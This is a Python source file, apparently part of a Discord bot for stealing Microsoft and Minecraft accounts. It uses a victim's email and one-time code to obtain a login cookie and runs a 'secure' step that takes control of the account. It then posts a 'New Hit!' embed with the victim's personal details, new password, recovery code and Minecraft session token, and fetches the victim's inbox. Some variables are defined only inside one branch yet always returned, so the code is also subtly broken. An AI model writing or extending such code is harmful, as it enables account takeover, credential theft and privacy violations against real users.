from views.utils.getMSAAUTH import getMSAAUTH

from views.utils.securing.getLiveData import getLiveData
from views.utils.securing.polishHost import polishHost
from views.utils.securing.secure import secure

from cogs.buttons.getInbox import getInbox

from discord import Embed
import httpx
import time

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
    
    data = await getLiveData(session) # {urlPost, ppft}
    msaauth = await getMSAAUTH(session, email, device, data, code)
    print(f"UnPolished MSAAUTH Cookie: {msaauth}")  
    print("[+] - Polishing login cookie...")
    
    # host = await polishHost(session, msaauth)
    # print(f"Polished MSAAUTH Cookie: {host}")   
    
    if not msaauth:
        print("[-] - Failed to get MSAAUTH | Invalid OTP Code")
        return None
    print("[+] - Got MSAAUTH | Starting to secure...")

    initialTime = time.time()
    account = await secure(session, recovery)
    finalTime = (time.time() - initialTime)

    print(account)

    infoEmbed = Embed()
 
    infoEmbed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
    infoEmbed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
    infoEmbed.add_field(name="Full Name", value=f"```{account['fullName']}```", inline=False)
    infoEmbed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
    infoEmbed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)
 
    hitEmbed = Embed(
        title = f"New Hit! Secured in {round(finalTime, 2)}s",
        color = 0xE4D00A
    )
 
    hitEmbed.add_field(name="MC Username", value=f"```{account['name']}```", inline=False)
    hitEmbed.add_field(name="MC Method", value=f"```{account['method']}```", inline=True)
    hitEmbed.add_field(name="MC Capes", value=f"```{account['capes']}```", inline=True)
    hitEmbed.add_field(name="Email", value=f"```{account['email']}```", inline=False)
    hitEmbed.add_field(name="Security Email", value=f"```{account['security_email']}```", inline=True)
    hitEmbed.add_field(name="Password", value=f"```{account['password']}```", inline=False)
    hitEmbed.add_field(name="Recovery Code", value=f"```{account['recovery_code']}```", inline=False)
 
    if account["method"] != "No Minecraft":
        
        mcEmbed = Embed()

        ssidEmbed = Embed(
            title = "SSID",
            description = f"```{account['SSID']}```",
            color = 0x50C878
        )
 

    return {
        "hit_embed": hitEmbed,
        "details": {
            "minecraft_embed": mcEmbed,
            "ssid_embed": ssidEmbed,
            "info_embed": infoEmbed,
            "account_details": (
                f"**Username:** {account['name']}\n"
                f"**Has MC:** {True if account['SSID'] else False}\n"
                f"**Capes:** {account['capes']}\n"
                f"**Email:** {account['email']}\n"
                f"**Password:** {account['password']}\n"
                f"**Recovery Code:** {account['recovery_code']}"
            ),
            "account_inbox": await getInbox(account["email"])
        }
    }
    